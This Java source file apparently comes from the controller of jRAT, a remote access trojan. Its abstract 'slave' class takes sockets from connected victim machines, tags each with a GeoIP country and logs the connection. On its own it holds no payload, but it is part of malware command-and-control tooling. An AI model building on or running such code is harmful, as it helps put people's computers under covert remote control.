package su.jrat.client;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.security.PublicKey;

import su.jrat.client.exceptions.CloseException;
import su.jrat.client.ip2c.Country;
import su.jrat.client.net.PortListener;
import su.jrat.client.settings.Settings;
import su.jrat.client.ui.panels.PanelMainLog;
import su.jrat.client.utils.FlagUtils;

public abstract class AbstractSlave implements Runnable {

	protected PortListener connection;
	protected Socket socket;

	protected InputStream inputStream;
	protected OutputStream outputStream;
	protected DataOutputStream dos;
	protected DataInputStream dis;
	
	protected String country;
	protected PublicKey rsaKey;
	protected byte[] key;

	private String ip;
	private String host;

	public AbstractSlave(PortListener connection, Socket socket) {
		this.connection = connection;
		this.socket = socket;

		this.ip = socket.getInetAddress().getHostAddress() + " / " + socket.getPort();
		this.host = socket.getInetAddress().getHostName();
	}

	public void initialize() throws Exception {
		this.inputStream = socket.getInputStream();
		this.outputStream = socket.getOutputStream();

		this.dis = new DataInputStream(inputStream);
		this.dos = new DataOutputStream(outputStream);
		
		this.socket.setSoTimeout(connection.getTimeout());
		this.socket.setTrafficClass(24);
		
		if (Settings.getGlobal().getBoolean("geoip")) {
			Country country = FlagUtils.getCountry(this);

			if (country != null) {
				this.country = country.get2cStr();

				if (this.country.equalsIgnoreCase("ZZ")) {
					this.country = "?";
				}
			} else {
				this.country = "?";
			}
		} else {
			this.country = "?";
		}

		PanelMainLog.instance.addEntry("Connect", this, "");
	}

	public AbstractSlave(String ip) {
		this.ip = ip;
	}

	public PortListener getConnection() {
		return connection;
	}

	public Socket getSocket() {
		return socket;
	}

	public String getIP() {
		return ip;
	}
	
	public String getHost() {
		return host;
	}
	
	public String getRawIP() {
		return getIP().split(" / ")[0];
	}

	public String getPort() {
		return getIP().split(" / ")[1];
	}
	
	public void closeSocket(CloseException ex) {
		try {
			socket.close();
			ex.printStackTrace();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
